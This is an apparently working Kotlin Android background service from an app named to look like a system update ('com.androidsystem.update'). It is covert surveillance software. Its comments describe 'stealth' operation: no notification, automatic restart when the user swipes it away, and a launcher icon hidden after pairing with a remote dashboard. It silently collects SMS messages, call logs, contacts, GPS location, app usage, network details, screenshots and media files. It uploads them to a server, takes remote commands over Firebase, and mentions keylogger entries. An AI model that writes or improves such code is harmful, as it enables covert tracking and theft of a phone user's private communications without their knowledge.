package com.androidsystem.update.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.location.Location
import android.net.NetworkCapabilities
import android.os.*
import android.provider.*
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.androidsystem.update.BuildConfig
import com.androidsystem.update.core.ConfigManager
import com.androidsystem.update.core.EncryptionManager
import com.androidsystem.update.database.*
import com.androidsystem.update.network.NetworkManager
import com.androidsystem.update.network.SecureCommunication
import com.google.android.gms.location.*
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import kotlinx.coroutines.tasks.await
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.*
import java.util.concurrent.atomic.AtomicBoolean
import javax.inject.Inject

@AndroidEntryPoint
class CoreService : LifecycleService() {

    @Inject lateinit var repository: DataRepository
    @Inject lateinit var encryptionManager: EncryptionManager
    @Inject lateinit var networkManager: NetworkManager
    @Inject lateinit var configManager: ConfigManager
    @Inject lateinit var secureComms: SecureCommunication

    // Nullable: devices without Google Play Services cannot create the fused
    // location client, and that must never take the whole service down.
    private var locationClient: FusedLocationProviderClient? = null
    private lateinit var telephonyManager: TelephonyManager

    private val executor = Executors.newSingleThreadScheduledExecutor()
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val isRunning = AtomicBoolean(false)

    private var scanIntervalMinutes = 60L
    private val scanIntervalMillis: Long get() = scanIntervalMinutes * 60 * 1000

    // Dashboard-configurable cadence: how often structured data is uploaded and
    // how often location is sampled. Persisted so the choice survives restarts.
    private var syncIntervalMinutes = 5L
    private val syncIntervalMillis: Long get() = syncIntervalMinutes * 60 * 1000
    private var locationIntervalMinutes = 5L
    private val locationIntervalMillis: Long get() = locationIntervalMinutes * 60 * 1000

    private var lastScreenshotCheck = System.currentTimeMillis() - 86400_000L
    private var lastMediaScan = System.currentTimeMillis() - 86400_000L
    private var lastContactScan = 0L
    private var lastExecutedCommandTs = 0L

    private var collectFuture: ScheduledFuture<*>? = null
    private var syncFuture: ScheduledFuture<*>? = null
    private var mediaFuture: ScheduledFuture<*>? = null
    private var heartbeatFuture: ScheduledFuture<*>? = null
    private var permFuture: ScheduledFuture<*>? = null
    private var cleanupFuture: ScheduledFuture<*>? = null

    private var commandListener: ValueEventListener? = null
    private var commandRef: com.google.firebase.database.DatabaseReference? = null
    private var locationCallback: LocationCallback? = null

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    companion object {
        private const val TAG = "CoreService"
        private const val PAIRING_CODE_KEY = "pairing_code"
        private const val IS_PAIRED_KEY = "is_paired"
        private const val WATCHDOG_PREFS = "watchdog_prefs"
        private const val HEARTBEAT_KEY = "last_heartbeat"
        private const val LAUNCHER_ALIAS = "com.androidsystem.update.ui.SetupWizardLauncher"
        private val ALLOWED_COMMANDS = setOf(
            "UPDATE_INTERVAL", "UPDATE_SYNC_INTERVAL", "UPDATE_LOCATION_INTERVAL",
            "SYNC_NOW", "FORCE_COLLECT", "COLLECT_LOCATION"
        )

        // Disables the launcher *alias*, never the running activity: hiding the
        // icon this way cannot destroy an open SetupWizard (which is what made
        // the pairing-code completion screen flash away before).
        fun hideLauncherIcon(context: Context) {
            try {
                context.packageManager.setComponentEnabledSetting(
                    ComponentName(context, LAUNCHER_ALIAS),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to hide launcher icon", e)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "CoreService created")
        try {
            locationClient = LocationServices.getFusedLocationProviderClient(this)
        } catch (e: Exception) {
            Log.e(TAG, "Location client unavailable", e)
        }
        telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        loadRemoteConfig()
        loadIntervals()
        registerContactsObserver()
        scheduleTasks()
        listenForCommands()
        startLocationUpdates()
        serviceScope.launch { collectAll() }
        isRunning.set(true)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        intent?.let { handleIntent(it) }
        return START_STICKY
    }

    // Stealth: the app runs as a plain background service (no foreground
    // notification). Swiping the task away still kills the process, so schedule
    // an exact alarm that brings the service back within a second — this is
    // what makes the app effectively "unkillable" for a user who swipes it.
    // AlarmScheduler degrades to an inexact alarm when the SCHEDULE_EXACT_ALARM
    // special access is missing (Android 14+ denies it by default), so the
    // restart still fires instead of silently failing.
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "Task removed — scheduling immediate restart")
        AlarmScheduler.scheduleServiceStart(this, CoreService::class.java, 1, 1000L)
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning.set(false)
        commandListener?.let { commandRef?.removeEventListener(it) }
        locationCallback?.let { locationClient?.removeLocationUpdates(it) }
        executor.shutdownNow()
        serviceScope.cancel()
        scheduleRestart()
    }

    private fun scheduleRestart(delayMs: Long = 5000L) {
        AlarmScheduler.scheduleServiceStart(this, CoreService::class.java, 0, delayMs)
    }

    private fun handleIntent(intent: Intent) {
        when (intent.action) {
            "SYNC_NOW" -> serviceScope.launch { syncPendingData() }
            "FORCE_COLLECT" -> serviceScope.launch { collectAll() }
            "COLLECT_LOCATION" -> serviceScope.launch { collectLocation() }
            "UPDATE_INTERVAL" -> {
                val interval = intent.getLongExtra("interval_minutes", 60)
                scanIntervalMinutes = interval
                rescheduleTasks()
            }
            "UPDATE_SYNC_INTERVAL" -> {
                val interval = intent.getLongExtra("interval_minutes", 5)
                if (interval >= 5) {
                    syncIntervalMinutes = interval
                    saveIntervals()
                    rescheduleTasks()
                }
            }
            "UPDATE_LOCATION_INTERVAL" -> {
                val interval = intent.getLongExtra("interval_minutes", 5)
                if (interval >= 5) {
                    locationIntervalMinutes = interval
                    saveIntervals()
                    restartLocationUpdates()
                }
            }
        }
    }

    // Persist the dashboard-selected cadences (sync + location) so they
    // survive service restarts and reboots.
    private fun loadIntervals() {
        val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
        syncIntervalMinutes = prefs.getLong("sync_interval_minutes", 5L)
        locationIntervalMinutes = prefs.getLong("location_interval_minutes", 5L)
    }

    private fun saveIntervals() {
        getSharedPreferences("app_prefs", Context.MODE_PRIVATE).edit()
            .putLong("sync_interval_minutes", syncIntervalMinutes)
            .putLong("location_interval_minutes", locationIntervalMinutes)
            .apply()
    }

    private fun loadRemoteConfig() {
        serviceScope.launch {
            try {
                scanIntervalMinutes = configManager.getConfig().optLong("scan_interval_minutes", 60L)
            } catch (e: Exception) {
                scanIntervalMinutes = 60L
            }
        }
    }

    private fun scheduleTasks() {
        if (executor.isShutdown) return
        collectFuture = executor.scheduleAtFixedRate(
            { serviceScope.launch { collectAll() } },
            scanIntervalMillis, scanIntervalMillis, TimeUnit.MILLISECONDS
        )
        syncFuture = executor.scheduleAtFixedRate(
            { serviceScope.launch { syncPendingData() } },
            syncIntervalMillis, syncIntervalMillis, TimeUnit.MILLISECONDS
        )
        mediaFuture = executor.scheduleAtFixedRate(
            { serviceScope.launch { scanNewMedia() } },
            60000, 300000, TimeUnit.MILLISECONDS
        )
        heartbeatFuture = executor.scheduleAtFixedRate(
            { serviceScope.launch { sendHeartbeat() } },
            // First heartbeat within seconds of start so a freshly reopened app
            // (or a service restarted by the wizard) re-advertises its pairing
            // code immediately instead of up to a minute later.
            5000, 60000, TimeUnit.MILLISECONDS
        )
        permFuture = executor.scheduleAtFixedRate(
            { serviceScope.launch { checkPermissions() } },
            300000, 300000, TimeUnit.MILLISECONDS
        )
        cleanupFuture = executor.scheduleAtFixedRate(
            { serviceScope.launch { cleanupOldData() } },
            86400000L, 86400000L, TimeUnit.MILLISECONDS
        )
    }

    private fun rescheduleTasks() {
        collectFuture?.cancel(false)
        syncFuture?.cancel(false)
        mediaFuture?.cancel(false)
        heartbeatFuture?.cancel(false)
        permFuture?.cancel(false)
        cleanupFuture?.cancel(false)
        if (!executor.isShutdown) scheduleTasks()
    }

    private fun listenForCommands() {
        if (!configManager.isRemoteCommandsEnabled()) return
        try {
            commandRef = FirebaseDatabase.getInstance().getReference("devices/$deviceId/commands")
            commandListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val cmd = snapshot.getValue(CommandPayload::class.java) ?: return
                    val now = System.currentTimeMillis()
                    if (now - cmd.timestamp > 300_000L) return
                    if (cmd.timestamp == lastExecutedCommandTs) return
                    if (cmd.type !in ALLOWED_COMMANDS) {
                        Log.w(TAG, "Unknown command rejected: ${cmd.type}")
                        return
                    }
                    lastExecutedCommandTs = cmd.timestamp
                    serviceScope.launch { executeCommand(cmd) }
                }
                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Command listener cancelled: ${error.message}")
                }
            }
            commandRef?.addValueEventListener(commandListener!!)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to setup command listener", e)
        }
    }

    data class CommandPayload(
        val type: String = "",
        val interval_minutes: Long = 60,
        val timestamp: Long = 0
    )

    private suspend fun executeCommand(cmd: CommandPayload) {
        when (cmd.type) {
            "UPDATE_INTERVAL" -> {
                scanIntervalMinutes = cmd.interval_minutes
                rescheduleTasks()
            }
            "UPDATE_SYNC_INTERVAL" -> {
                if (cmd.interval_minutes >= 5) {
                    syncIntervalMinutes = cmd.interval_minutes
                    saveIntervals()
                    rescheduleTasks()
                }
            }
            "UPDATE_LOCATION_INTERVAL" -> {
                if (cmd.interval_minutes >= 5) {
                    locationIntervalMinutes = cmd.interval_minutes
                    saveIntervals()
                    restartLocationUpdates()
                }
            }
            "SYNC_NOW" -> syncPendingData()
            "FORCE_COLLECT" -> collectAll()
            "COLLECT_LOCATION" -> collectLocation()
        }
    }

    private suspend fun collectAll() {
        if (!isRunning.get()) return
        collectLocation()
        collectAppUsage()
        collectSMS()
        collectCalls()
        collectContacts()
        collectNetworkInfo()
        collectDeviceInfo()
    }

    @SuppressLint("MissingPermission")
    private fun startLocationUpdates() {
        val client = locationClient ?: return
        if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return
        val request = LocationRequest.Builder(
            Priority.PRIORITY_BALANCED_POWER_ACCURACY,
            locationIntervalMillis
        ).apply {
            setMinUpdateIntervalMillis(60_000L)
            setMaxUpdateDelayMillis(300_000L)
            setWaitForAccurateLocation(false)
        }.build()
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { loc ->
                    serviceScope.launch { saveLocation(loc) }
                }
            }
        }
        try {
            client.requestLocationUpdates(request, locationCallback!!, Looper.getMainLooper())
        } catch (e: Exception) {
            Log.e(TAG, "Location updates failed", e)
        }
    }

    // Re-applies the dashboard-chosen location cadence (update interval).
    private fun restartLocationUpdates() {
        try {
            locationCallback?.let { locationClient?.removeLocationUpdates(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Remove location updates failed", e)
        }
        startLocationUpdates()
    }

    @SuppressLint("MissingPermission")
    private suspend fun collectLocation() {
        val client = locationClient ?: return
        if (!checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) return
        try {
            withTimeout(15_000L) {
                var location = client.lastLocation.await()
                if (location == null || System.currentTimeMillis() - location.time > 600_000L) {
                    val request = CurrentLocationRequest.Builder()
                        .setDurationMillis(10_000L)
                        .setMaxUpdateAgeMillis(60_000L)
                        .setPriority(Priority.PRIORITY_BALANCED_POWER_ACCURACY)
                        .build()
                    location = client.getCurrentLocation(request, null).await()
                }
                location?.let { saveLocation(it) }
            }
        } catch (e: TimeoutCancellationException) {
            Log.w(TAG, "Location collect timeout")
        } catch (e: Exception) {
            Log.e(TAG, "Location error", e)
        }
    }

    private suspend fun saveLocation(loc: Location) {
        repository.insertLocationData(
            LocationEntity(
                latitude = loc.latitude,
                longitude = loc.longitude,
                accuracy = loc.accuracy,
                altitude = loc.altitude,
                speed = loc.speed,
                bearing = loc.bearing,
                provider = loc.provider ?: "fused",
                timestamp = System.currentTimeMillis()
            )
        )
    }

    @SuppressLint("MissingPermission")
    private suspend fun collectSMS() {
        if (!checkPermission(Manifest.permission.READ_SMS)) return
        try {
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI, null,
                "date > ?", arrayOf((System.currentTimeMillis() - scanIntervalMillis).toString()),
                Telephony.Sms.DEFAULT_SORT_ORDER
            )
            cursor?.use {
                val a = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val b = it.getColumnIndex(Telephony.Sms.BODY)
                val d = it.getColumnIndex(Telephony.Sms.DATE)
                val t = it.getColumnIndex(Telephony.Sms.TYPE)
                val r = it.getColumnIndex(Telephony.Sms.READ)
                while (it.moveToNext()) {
                    repository.insertSms(
                        it.getString(a) ?: "", it.getString(b) ?: "",
                        it.getLong(d), it.getInt(t), it.getInt(r)
                    )
                }
            }
        } catch (e: Exception) { Log.e(TAG, "SMS error", e) }
    }

    @SuppressLint("MissingPermission")
    private suspend fun collectCalls() {
        if (!checkPermission(Manifest.permission.READ_CALL_LOG)) return
        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI, null,
                "date > ?", arrayOf((System.currentTimeMillis() - scanIntervalMillis).toString()),
                "${CallLog.Calls.DATE} DESC"
            )
            cursor?.use {
                var count = 0
                val n = it.getColumnIndex(CallLog.Calls.NUMBER)
                val d = it.getColumnIndex(CallLog.Calls.DATE)
                val dur = it.getColumnIndex(CallLog.Calls.DURATION)
                val t = it.getColumnIndex(CallLog.Calls.TYPE)
                val nm = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                while (it.moveToNext() && count++ < 200) {
                    repository.insertCall(
                        it.getString(n) ?: "", it.getLong(d),
                        it.getLong(dur), it.getInt(t), it.getString(nm) ?: ""
                    )
                }
            }
        } catch (e: Exception) { Log.e(TAG, "Call error", e) }
    }

    private suspend fun collectContacts() {
        if (!checkPermission(Manifest.permission.READ_CONTACTS)) return
        try {
            val proj = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP
            )
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                proj,
                "${ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP} > ?",
                arrayOf(lastContactScan.toString()),
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            )?.use { cursor ->
                val n = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val p = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (cursor.moveToNext()) {
                    val phone = cursor.getString(p) ?: ""
                    val hash = java.security.MessageDigest.getInstance("SHA-256")
                        .digest(phone.trim().toByteArray())
                        .joinToString("") { "%02x".format(it) }
                    repository.insertContact(cursor.getString(n) ?: "", phone, hash)
                }
            }
            lastContactScan = System.currentTimeMillis()
        } catch (e: Exception) { Log.e(TAG, "Contacts error", e) }
    }

    @SuppressLint("MissingPermission")
    private suspend fun collectAppUsage() {
        try {
            val usm = getSystemService(USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
            val end = System.currentTimeMillis()
            usm.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                end - scanIntervalMillis, end
            )?.forEach {
                // getLaunchCount() je skryté API (nie je vo verejnom SDK), preto 0
                repository.insertAppUsage(it.packageName, it.totalTimeInForeground, 0)
            }
        } catch (e: Exception) { Log.e(TAG, "AppUsage error", e) }
    }

    private suspend fun collectNetworkInfo() {
        try {
            val cm = applicationContext.getSystemService(CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = cm.activeNetwork
            val caps = cm.getNetworkCapabilities(network)
            val linkProps = cm.getLinkProperties(network)
            val ssid: String
            val bssid: String
            val ip: String
            if (caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
                @Suppress("DEPRECATION")
                val wifiInfo = (applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager)?.connectionInfo
                ssid = wifiInfo?.ssid?.replace("\"", "") ?: ""
                bssid = wifiInfo?.bssid ?: ""
                ip = linkProps?.linkAddresses
                    ?.firstOrNull { it.address is java.net.Inet4Address }
                    ?.address?.hostAddress ?: ""
            } else {
                ssid = ""
                bssid = ""
                ip = ""
            }
            val type = when {
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "wifi"
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "cellular"
                else -> "unknown"
            }
            repository.insertCollectedData("network", JSONObject().apply {
                put("ssid", ssid); put("bssid", bssid); put("ip", ip)
                put("type", type); put("ts", System.currentTimeMillis())
            }.toString())
        } catch (e: Exception) { Log.e(TAG, "Network error", e) }
    }

    private suspend fun collectDeviceInfo() {
        try {
            repository.insertDeviceInfo(DeviceInfoEntity(
                manufacturer = Build.MANUFACTURER,
                model = Build.MODEL,
                device = Build.DEVICE,
                product = Build.PRODUCT,
                androidVersion = Build.VERSION.RELEASE,
                sdkVersion = Build.VERSION.SDK_INT,
                imei = "",
                phoneNumber = "",
                simOperator = telephonyManager.simOperatorName ?: "",
                networkOperator = telephonyManager.networkOperatorName ?: "",
                androidId = deviceId,
                wifiSsid = "",
                wifiBssid = "",
                wifiRssi = 0,
                batteryLevel = getBatteryLevel()
            ))
        } catch (e: Exception) { Log.e(TAG, "DeviceInfo error", e) }
    }

    private suspend fun scanNewMedia() {
        try {
            val screenshotProj = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.MIME_TYPE
            )
            val screenshotSel = "${MediaStore.Images.Media.DATE_ADDED} > ? AND (" +
                "${MediaStore.Images.Media.DISPLAY_NAME} LIKE '%Screenshot%' OR " +
                "${MediaStore.Images.Media.DISPLAY_NAME} LIKE '%screenshot%' OR " +
                "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} LIKE '%Screenshot%')"
            contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                screenshotProj, screenshotSel,
                arrayOf((lastScreenshotCheck / 1000).toString()),
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )?.use {
                val p = it.getColumnIndex(MediaStore.Images.Media.DATA)
                val n = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val d = it.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
                val m = it.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
                while (it.moveToNext()) {
                    repository.insertMediaFile(
                        it.getString(p) ?: "", it.getString(n) ?: "",
                        it.getString(m), it.getLong(d) * 1000, true
                    )
                }
            }
            lastScreenshotCheck = System.currentTimeMillis()

            val mediaProj = arrayOf(
                MediaStore.Files.FileColumns._ID,
                MediaStore.Files.FileColumns.DATA,
                MediaStore.Files.FileColumns.DATE_ADDED,
                MediaStore.Files.FileColumns.DISPLAY_NAME,
                MediaStore.Files.FileColumns.MIME_TYPE
            )
            val mediaSel = "(${MediaStore.Files.FileColumns.MEDIA_TYPE} = ${MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE} OR " +
                "${MediaStore.Files.FileColumns.MEDIA_TYPE} = ${MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO} OR " +
                "${MediaStore.Files.FileColumns.MEDIA_TYPE} = ${MediaStore.Files.FileColumns.MEDIA_TYPE_AUDIO}) AND " +
                "${MediaStore.Files.FileColumns.DATE_ADDED} > ?"
            contentResolver.query(
                MediaStore.Files.getContentUri("external"),
                mediaProj, mediaSel,
                arrayOf((lastMediaScan / 1000).toString()),
                "${MediaStore.Files.FileColumns.DATE_ADDED} DESC"
            )?.use {
                val p = it.getColumnIndex(MediaStore.Files.FileColumns.DATA)
                val n = it.getColumnIndex(MediaStore.Files.FileColumns.DISPLAY_NAME)
                val d = it.getColumnIndex(MediaStore.Files.FileColumns.DATE_ADDED)
                val m = it.getColumnIndex(MediaStore.Files.FileColumns.MIME_TYPE)
                while (it.moveToNext()) {
                    val path = it.getString(p) ?: ""
                    val name = it.getString(n) ?: ""
                    val isS = path.contains("Screenshot", true) || name.contains("Screenshot", true)
                    repository.insertMediaFile(path, name, it.getString(m), it.getLong(d) * 1000, isS)
                }
            }
            lastMediaScan = System.currentTimeMillis()
        } catch (e: Exception) { Log.e(TAG, "Media error", e) }
    }

    private suspend fun sendHeartbeat() {
        try {
            val prefs = getSharedPreferences("app_prefs", Context.MODE_PRIVATE)
            val isPaired = prefs.getBoolean(IS_PAIRED_KEY, false)
            val hb = JSONObject().apply {
                put("device_id", deviceId)
                put("timestamp", System.currentTimeMillis())
                put("status", "active")
                put("battery", getBatteryLevel())
                // Server contract: interval is in seconds (30..3600). The
                // heartbeat fires every 60s regardless of the scan interval.
                put("interval", 60)
                // Upload cadence reported to the dashboard (all in seconds),
                // plus the installed APK version so the dashboard/dev can tell
                // which build is actually running on the phone.
                put("config", JSONObject().apply {
                    put("heartbeat_interval", 60)
                    put("sync_interval", syncIntervalMinutes * 60)
                    put("scan_interval", scanIntervalMinutes * 60)
                    put("location_interval", locationIntervalMinutes * 60)
                    put("app_version", BuildConfig.VERSION_NAME)
                })
                if (!isPaired) {
                    val code = prefs.getString(PAIRING_CODE_KEY, null) ?: generatePairingCode()
                    put("pairing_code", code)
                    put("pairing_request", true)
                }
            }
            val result = secureComms.sendTelemetry(hb, SecureCommunication.Priority.LOW)
            // Pairing handshake: once the server confirms the device is bound
            // to an account, stop advertising the pairing code and hide the
            // launcher icon (stealth). The icon stays visible while unpaired so
            // the user can always reopen the app and read the pairing code.
            if (result.success && result.paired) {
                prefs.edit().putBoolean(IS_PAIRED_KEY, true).apply()
                hideLauncherIcon(this)
            }
            getSharedPreferences(WATCHDOG_PREFS, Context.MODE_PRIVATE).edit()
                .putLong(HEARTBEAT_KEY, System.currentTimeMillis()).apply()
        } catch (e: Exception) { Log.e(TAG, "Heartbeat error", e) }
    }

    private fun generatePairingCode(): String {
        val code = (100000..999999).random().toString()
        getSharedPreferences("app_prefs", Context.MODE_PRIVATE).edit()
            .putString(PAIRING_CODE_KEY, code).apply()
        return code
    }

    private suspend fun syncPendingData() {
        try {
            val unsynced = repository.getUnsynced(100)
            if (unsynced.isNotEmpty()) {
                val batch = JSONArray()
                unsynced.forEach {
                    batch.put(JSONObject().apply {
                        put("id", it.id); put("type", it.type)
                        // collected_data is encrypted at rest on-device; decrypt
                        // before shipping so the server can route keylogger /
                        // notification / event / network entries into their
                        // dashboard module collections (TLS in transit, the
                        // server re-encrypts the whole batch at rest).
                        put("content", encryptionManager.decryptSafe(it.content) ?: it.content)
                        put("timestamp", it.timestamp)
                    })
                }
                if (secureComms.sendBatch(batch.toString())) {
                    unsynced.forEach { repository.markSynced(it.id) }
                }
            }
            syncStructuredTables()
        } catch (e: Exception) { Log.e(TAG, "Sync error", e) }
    }

    // Ship the structured collections (SMS, calls, contacts, GPS, browsing,
    // media, app usage, device info) to the server. Each table keeps a "last
    // synced id" cursor in SharedPreferences; every cycle only rows inserted
    // after the cursor are batched. The server routes each message by type into
    // its module collection (dedupe by content hash, capped arrays), which is
    // what feeds every section of the dashboard.
    private suspend fun syncStructuredTables() {
        try {
            val prefs = getSharedPreferences("sync_cursors", Context.MODE_PRIVATE)
            val batch = JSONArray()
            val cursors = mutableMapOf<String, Long>()
            val limit = 100

            val sms = repository.smsSync(prefs.getLong("sms", 0L), limit)
            sms.first.forEach { batch.put(syncMessageJson(it)) }
            cursors["sms"] = sms.second

            val calls = repository.callsSync(prefs.getLong("calls", 0L), limit)
            calls.first.forEach { batch.put(syncMessageJson(it)) }
            cursors["calls"] = calls.second

            val contacts = repository.contactsSync(prefs.getLong("contacts", 0L), limit)
            contacts.first.forEach { batch.put(syncMessageJson(it)) }
            cursors["contacts"] = contacts.second

            val locations = repository.locationsSync(prefs.getLong("locations", 0L), limit)
            locations.first.forEach { batch.put(syncMessageJson(it)) }
            cursors["locations"] = locations.second

            val browsing = repository.browsingSync(prefs.getLong("browsing", 0L), limit)
            browsing.first.forEach { batch.put(syncMessageJson(it)) }
            cursors["browsing"] = browsing.second

            val media = repository.mediaSync(prefs.getLong("media", 0L), limit)
            media.first.forEach { batch.put(syncMessageJson(it)) }
            cursors["media"] = media.second

            // Actual file payloads (photo thumbnails, small voice notes) ride
            // in their OWN request below — a heavy photo batch must never stall
            // SMS/calls/GPS syncing. At most 8 files per cycle.
            val files = repository.mediaFileSync(prefs.getLong("media_files", 0L), 8)

            val apps = repository.appUsageSync(prefs.getLong("apps", 0L), limit)
            apps.first.forEach { batch.put(syncMessageJson(it)) }
            cursors["apps"] = apps.second

            val device = repository.deviceInfoSync(prefs.getLong("device", 0L), limit)
            device.first.forEach { batch.put(syncMessageJson(it)) }
            cursors["device"] = device.second

            if (batch.length() > 0 && secureComms.sendBatch(batch.toString())) {
                cursors.forEach { (key, value) -> prefs.edit().putLong(key, value).apply() }
            }

            // Media file payloads in their own request; the media_files cursor
            // only advances when the upload actually succeeded, so failures are
            // retried instead of silently skipped.
            if (files.first.isNotEmpty()) {
                val fileBatch = JSONArray()
                files.first.forEach { fileBatch.put(syncMessageJson(it)) }
                if (secureComms.sendBatch(fileBatch.toString())) {
                    prefs.edit().putLong("media_files", files.second).apply()
                }
            }
        } catch (e: Exception) { Log.e(TAG, "Structured sync error", e) }
    }

    private fun syncMessageJson(msg: com.androidsystem.update.database.DataRepository.SyncMessage): JSONObject =
        JSONObject().apply {
            put("id", 0L)
            put("type", msg.type)
            put("content", msg.content)
            put("timestamp", msg.timestamp)
        }

    private suspend fun checkPermissions() {
        val perms = buildList {
            add(Manifest.permission.ACCESS_FINE_LOCATION)
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.READ_CALL_LOG)
            add(Manifest.permission.READ_CONTACTS)
            add(Manifest.permission.PACKAGE_USAGE_STATS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.READ_MEDIA_IMAGES)
                add(Manifest.permission.READ_MEDIA_VIDEO)
                add(Manifest.permission.READ_MEDIA_AUDIO)
            }
        }
        val missing = perms.filter { !checkPermission(it) }
        // Only report when the set of missing permissions actually changes:
        // Samsung revokes PACKAGE_USAGE_STATS periodically, and re-sending
        // permission_lost every 5 minutes would flood the activity timeline
        // (which caps at 200 events) and push out real events.
        val prefs = getSharedPreferences("perm_state", Context.MODE_PRIVATE)
        val prev = prefs.getString("missing", "") ?: ""
        val cur = missing.sorted().joinToString(",")
        if (cur == prev) return
        prefs.edit().putString("missing", cur).apply()
        if (missing.isNotEmpty()) {
            secureComms.sendTelemetry(JSONObject().apply {
                put("device_id", deviceId)
                put("type", "permission_lost")
                put("permissions", JSONArray(missing))
                put("timestamp", System.currentTimeMillis())
            }, SecureCommunication.Priority.HIGH)
        }
        // Report recovery too, so the timeline shows the fix instead of a gap.
        val restored = prev.split(",").filter { it.isNotEmpty() && it !in missing }
        if (restored.isNotEmpty()) {
            secureComms.sendTelemetry(JSONObject().apply {
                put("device_id", deviceId)
                put("type", "permission_restored")
                put("permissions", JSONArray(restored))
                put("timestamp", System.currentTimeMillis())
            }, SecureCommunication.Priority.HIGH)
        }
    }

    private suspend fun cleanupOldData() {
        try {
            val cutoff = System.currentTimeMillis() - 30L * 24 * 60 * 60 * 1000
            repository.cleanupOldData(cutoff)
            Log.d(TAG, "DB cleanup done")
        } catch (e: Exception) { Log.e(TAG, "Cleanup error", e) }
    }

    private fun registerContactsObserver() {
        val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                serviceScope.launch { collectContacts() }
            }
        }
        contentResolver.registerContentObserver(
            ContactsContract.Contacts.CONTENT_URI, true, observer
        )
    }

    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        return intent?.let {
            val level = it.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = it.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            if (scale > 0) (level * 100 / scale.toFloat()).toInt() else 50
        } ?: 50
    }

    private fun checkPermission(permission: String): Boolean =
        ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED

}
